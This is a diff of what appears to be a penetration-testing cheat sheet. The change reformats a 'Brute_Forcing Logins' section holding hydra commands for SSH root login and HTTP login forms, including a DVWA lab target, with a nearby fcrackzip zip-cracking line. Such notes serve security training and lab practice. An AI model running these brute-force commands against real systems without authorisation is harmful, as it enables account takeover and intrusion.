@@ -188,8 +188,10 @@ fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u b******.*** -v
 
 Brute_Forcing Logins
 ====================
-SSH: hydra -s 22 -v -V -l root -P /usr/share/wordlists/rockyou.txt -t 8 IP ssh
-HTTP: hydra -l username -P wordlist.txt IP http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
+SSH
+      hydra -s 22 -v -V -l root -P /usr/share/wordlists/rockyou.txt -t 8 IP ssh
+HTTP
+      hydra -l username -P wordlist.txt IP http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
 
       hydra -L usernames.txt -P passwords.txt IP http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"
       
